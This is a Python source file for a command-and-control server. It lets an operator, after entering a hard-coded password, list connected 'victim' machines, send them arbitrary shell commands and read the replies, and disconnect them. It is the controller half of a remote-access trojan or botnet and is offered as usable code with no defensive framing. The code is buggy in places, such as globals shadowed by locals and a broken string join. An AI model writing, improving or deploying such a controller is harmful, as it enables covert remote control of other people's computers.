import socket, select
import time
import _thread as thread
PASSWORD = "urmom"
auth = False
socks = [] #socks
clients = {} #{'username' : 'sock'}
user = {} #{'sock' : 'username'}
unames = [] #usernames
adminsock = socket.socket()

def send():
    print(unames)
    name = input("Username to command: ")
    while name not in unames:
        name = input("Username to command: ")
    if name in unames:
        command = input("Enter command to send: ")
        while command != "back":
            vicsoc = clients[name]
            vicsoc.settimeout(5)
            vicsoc.send(command.encode())
            try:
                resp = vicsoc.recv(1024)
                print(resp.decode())
            except:
                print("Timeout")
                return
            command = input("Enter command to send: ")
    else:
        return

def kill():
    return




def ver(sock):
    sock.send(b"Enter password: ")
    pword = sock.recv(1024).decode().strip()
    if pword == PASSWORD:
        auth = True
        adminsock = sock
        thread.start_new_thread(commander, (sock,))
        #thread.start_new_thread(waiting, ('a',))
    else:
        sock.send(b"Wrong Password")
    return
    


def newcon(soc):
    socks.append(soc)
    username = soc.recv(1024)
    username = username.decode().strip()
    print(username, " new connection")
    if username == "auth":
        ver(soc)
    else:
        try:
            d = "+++++++++++++++++++++++++"
            d += "%s Connected", username
            d += "+++++++++++++++++++++++++\n"
            adminsock.send(d.encode())
        except:
            auth = False
        clients[username] = soc
        user[soc] = username
        unames.append(username)
    return


def check(adminsock):
    online = '\n[' + ', '.join(unames) + ']\nThere are ' + str(len(unames)) + ' online clients'
    #print(online)
    adminsock.send(online.encode())
    adminsock.send(b"\nChoose Option Number: ")
    


def disconnection(s):
    if s in user:
        temp = user[s]
        unames.remove(temp)
        del user[s]
        del clients[temp]
        socks.remove(s)


def tout(sock, adminsock, command):
    try:
        sock.send(command.encode())
        #print("sent")
        data = sock.recv(1024).decode()
        #print(data, "response")
        adminsock.send(data.encode())
        adminsock.send('\nEnter Comamand: '.encode())
    except:
        adminsock.send(b"Error happened with connected computer :/\n")


def kill(username, adminsock, vicsoc):
    vicsoc.send(b"kill")
    sock = clients[username]
    disconnection(sock)
    adminsock.send(b"Killed.\n")
    sock.close()
    return


def commander(adminsock):
    vicsoc = socket.socket()
    thread.start_new_thread(check, (adminsock, ))
    time.sleep(0.5)
    adminsock.send(b"\n1) Command\n2) List online clients\n3) Kill\n4) Exit\n5) List Options\nChoose Option Number: ")
    while True:
        option = adminsock.recv(1024).decode().strip()
        if option == "2":
            thread.start_new_thread(check, (adminsock, ))

        elif option == "5":
            adminsock.send(b"\n1) Command\n2) List online clients\n3) Kill\n4) Exit\n5) List Options\n")

        elif option == "3":
            adminsock.send(b"\nEnter username: ")
            username = adminsock.recv(1024).decode().strip()
            vicsoc = clients[username]
            username = adminsock.recv(1024).decode().strip()
            thread.start_new_thread(kill, (username,adminsock,vicsoc ))

        elif option == '1':
            thread.start_new_thread(check, (adminsock, ))
            time.sleep(0.5)
            adminsock.send(b"\nEnter username: ")
            user = adminsock.recv(1024).decode().strip()
            vicsoc = clients[user]
            if user in unames:
                try:
                    adminsock.send(b"Enter Command: ")
                    command = adminsock.recv(1024).decode().strip()
                    vicsoc = clients[user]
                    while command != "back":
                        if len(command) > 1:
                            thread.start_new_thread(tout, (vicsoc,adminsock,command, ))
                            #adminsock.send(b"\nEnter Comamand: ")
                            command = adminsock.recv(1024).decode().strip()
                    
                except:
                    pass
        try:
            adminsock.send(b"\nChoose Option Number: ")
        except:
            pass
    return






def main():
    # Create a socket for listening

    while True:
        
        read, write, error = select.select(socks, [], [], 0)
        for sock in read:
            if sock == server_socket:
                soc, addr = server_socket.accept()
                #thread = threading.Thread(target=newcon(soc))
                #thread.start
                thread.start_new_thread(newcon, (soc,))
            else:
                try:
                    data = sock.recv(1024)
                    if not data:
                        if sock in user:
                            #print(user[sock], 'disconnected')
                            thread.start_new_thread(disconnection, (sock, ))
                except:
                    if sock in user:
                        #print(user[sock], 'disconnected')
                        thread.start_new_thread(disconnection, (sock, ))


server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_socket.bind(('192.168.1.9', 8000))
server_socket.listen()
socks.append(server_socket)
print("Server listening on port 8000...")


while True:
    main()

